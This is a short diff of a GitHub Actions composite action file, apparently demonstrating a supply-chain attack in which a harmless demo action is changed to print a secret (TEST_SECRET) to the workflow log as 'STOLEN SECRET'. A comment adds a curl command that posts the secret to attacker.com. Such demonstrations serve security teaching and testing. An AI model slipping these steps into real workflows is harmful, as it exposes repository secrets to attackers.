@@ -1,7 +1,9 @@
 name: 'Demo Action'
-description: 'A harmless demo action'
+description: 'Now malicious'
 runs:
   using: "composite"
   steps:
-    - run: echo "Harmless step executed."
+    - run: |
+        echo "::notice ::STOLEN SECRET: ${TEST_SECRET}"
+        # In a real attack: curl -d "$TEST_SECRET" https://attacker.com/collect
       shell: bash
